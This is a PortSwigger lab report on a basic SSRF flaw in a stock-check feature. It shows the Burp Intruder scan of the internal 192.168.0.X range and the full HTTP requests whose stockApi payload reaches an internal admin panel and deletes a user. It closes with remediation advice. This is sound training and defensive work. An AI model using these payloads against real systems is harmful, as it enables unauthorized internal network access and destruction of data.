# PortSwigger Web Security Academy Lab Report: Basic SSRF Against Another Back-End System



**Report ID:** PS-LAB-SSRF-002  

**Author:** Venu Kumar (Venu)  

**Date:** February 13, 2026  

**Lab Level:** Apprentice  

**Lab Title:** Basic SSRF against another back-end system



## Executive Summary:

**Vulnerability Type:** Server-Side Request Forgery (SSRF) – Basic / Internal Network Access  

**Severity:** High (CVSS 3.1 Score: 8.6 – AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N – unauthorized internal access)

**Description:** A Server-Side Request Forgery vulnerability exists in the stock check functionality. The application fetches data from a user-controlled URL (`stockApi` parameter) without validation, allowing the server to make arbitrary requests to internal back-end systems. Exploitation involves scanning the internal `192.168.0.X` range (port 8080) to locate an admin interface, accessing it, and deleting the user `carlos`.

**Impact:** Unauthorized access to internal networks, admin panels, or other back-end services not exposed publicly. In production, this could lead to data exfiltration, configuration leaks, or chained attacks (e.g., metadata theft).

**Status:** Exploited in controlled lab environment only; no real-world impact. Educational purposes.



## Environment and Tools Used:

**Target:** Simulated e-commerce site from PortSwigger Web Security Academy (e.g., `https://*.web-security-academy.net`)  

**Browser:** Google Chrome (Version 120.0 or similar)  

**Tools:** Burp Suite Community Edition (Version 2023.12 or similar) – Proxy interception, Repeater, Intruder for IP scanning  

**Operating System:** Windows 11  

**Test Date/Time:** February 13, 2026, approximately 10:44 AM IST



## Methodology:

Conducted following ethical hacking best practices in a simulated environment.

1. Accessed the lab via "Access the lab" in PortSwigger Academy.  
2. Selected a product → clicked "Check stock" → intercepted POST request to `/product/stock` in Burp Proxy.  
3. Sent request to Burp Repeater to confirm SSRF (response reflects fetched content).  
4. Sent to Burp Intruder:  
   - Highlighted the last octet of IP in `stockApi=http://192.168.0.1:8080/admin` → added as §payload§.  
   - Payloads tab: Numbers type → From 1 to 255, step 1.  
   - Started attack → looked for status 200 (successful response).  
5. Identified admin IP (e.g., `192.168.0.XX:8080/admin`) from successful response.  
6. Modified `stockApi` to `http://192.168.0.XX:8080/admin/delete?username=carlos` → sent → user deleted.  
7. Lab solved (green banner: "Congratulations, you solved the lab!").



## Detailed Findings:

**Vulnerable Endpoint:** POST `/product/stock` (stock check)

**Original Request (Captured in Burp):**

POST /product/stock HTTP/2
Host: 0ae3002803aef186809c354400340003.web-security-academy.net
Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
Content-Type: application/x-www-form-urlencoded

stockApi=http://192.168.0.64:8080/admin



**Reflected Output:**

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 3243

<!DOCTYPE html>
<html>
<head>
    <title>Basic SSRF against another back-end system</title>
</head>
<body>
    <!-- Lab header: "Not solved" status -->
    
    <!-- Admin panel shows SSRF'd backend: -->
    <h1>Users</h1>
    <div>wiener - <a href="/http://192.168.0.64:8080/admin/delete?username=wiener">Delete</a></div>
    <div>carlos - <a href="/http://192.168.0.64:8080/admin/delete?username=carlos">Delete</a></div>
</body>
</html>



Modified request 1:

POST /product/stock HTTP/2
Host: 0ae3002803aef186809c354400340003.web-security-academy.net
Cookie: session=Q9n7eU2KT6zIgGFFzQs5LPmsQz57swIL
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

stockApi=http://192.168.0.64:8080/admin/delete?username=carlos


Response:

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8

<!DOCTYPE html>
<!-- Lab header: "SOLVED" status -->
<p>User deleted successfully!</p>
<h1>Users</h1>
<div>wiener - <a href="/admin/delete?username=wiener">Delete</a></div>
<!-- Carlos account removed 



Proof of Exploitation:


![Proof of SSRF Error]()

Figure 1: Burp Intruder scan showing status 200 on valid IP (admin found).


![Proof of Successful SSRF Exploitation](https://github.com/venu-maxx/PortSwigger-SSRF-Lab-2/blob/5ab50cceea2ccb50fe1b534fd416aee2b80266a5/PortSwigger%20SSRF%20Lab%202%20success.png)

Figure 2: Successful deletion of user 'carlos'.


![Lab Solved Congratulations](https://github.com/venu-maxx/PortSwigger-SSRF-Lab-2/blob/50076e05649af40d9578cbcc51e6f73a46107518/PortSwigger%20SSRF%20Lab%202%20Lab%20Completion.png)

Figure 3: PortSwigger Academy confirmation – "Congratulations, you solved the lab!"



Exploitation Explanation:

The application trusts the stockApi URL and fetches it server-side, returning the response. No IP filtering prevents access to internal RFC 1918 ranges (192.168.0.0/16). Intruder brute-forced the last octet (1–255) on port 8080 to find the admin service. Once located, direct request to /admin/delete?username=carlos performed the action.



Risk Assessment:

Likelihood: High (user-controlled URL, no validation).
Impact: High to Critical — internal network scanning, unauthorized access, potential exfiltration or escalation.
Affected Components: Stock check backend fetch logic.



Recommendations for Remediation:

Validate URLs strictly (allowlist trusted external domains only).
Block private/internal IPs (RFC 1918: 192.168.x.x, 10.x.x.x, 172.16–31.x.x; localhost; metadata endpoints).
Use network segmentation / firewall rules to prevent app from accessing internal resources.
Sanitize/avoid returning full backend responses to clients.
Deploy WAF with SSRF detection rules.
Regular scanning (Burp Scanner, ZAP) and code reviews.



Conclusion and Lessons Learned:

This lab showed basic SSRF against internal back-end systems: scan private IP ranges via Intruder, access hidden admin, perform actions.

Key Takeaways:

SSRF often in "fetch from URL" features (stock checks, imports, webhooks).
Test private IPs (192.168.0.1–255, 10.0.0.1, etc.) and ports (8080 common).
Intruder excels for IP brute-forcing in SSRF.
Strengthened skills in SSRF detection, scanning, and exploitation.



References:

PortSwigger Academy: Basic SSRF against another back-end system
General: Server-side request forgery (SSRF)
